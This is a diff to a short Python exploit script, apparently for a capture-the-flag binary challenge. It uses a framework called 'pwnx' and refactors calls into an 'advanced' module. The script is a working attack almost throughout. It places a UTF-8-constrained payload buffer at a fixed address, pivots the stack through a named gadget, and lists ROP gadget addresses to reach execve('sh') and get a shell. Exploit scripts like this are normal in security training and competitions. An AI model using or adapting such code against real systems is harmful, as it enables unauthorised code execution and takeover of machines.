@@ -1,4 +1,5 @@
 from pwnx import Challenge, bytes_, choice, field, integer, utf8
+from pwnx.advanced import controlled_buffer, pivot, rop_palette
 
 
 x = Challenge("./challenge")
@@ -9,12 +10,13 @@ store = x.protocol.menu(b"> ", name="store").define(
     show=choice(b"3"),
 )
 
-message = x.buffer(
+message = controlled_buffer(
+    x,
     "message",
     at=0x2F9E38,
     size=0x1000,
-    write=store.message,
-    constraint=utf8(),
+    writer=store.message,
+    constraints=[utf8()],
 )
 
 call = x.control(
@@ -27,11 +29,12 @@ call = x.control(
     )
 )
 
-pivot = x.control(
-    call.pivot(stack=message, pointer_register="eax", gadget=0x242D79)
+pivot_control = x.control(
+    pivot(call, stack=message, pointer_register="eax", gadget=0x242D79)
 )
 
-rop = x.rop.palette(
+rop = rop_palette(
+    x,
     pop={"rdi": 0x243565, "rsi": 0x243431, "rcx": 0x247566},
     zero={"rax": 0x247431},
     move={("rdx", "rax"): 0x2B184E, ("rax", "rcx"): 0x2B4E73},
@@ -39,5 +42,5 @@ rop = x.rop.palette(
     constraints=[utf8()],
 )
 
-x.want(x.execve("sh"), via=pivot, using=rop)
+x.want(x.execve("sh"), via=pivot_control, using=rop)
 x.run()
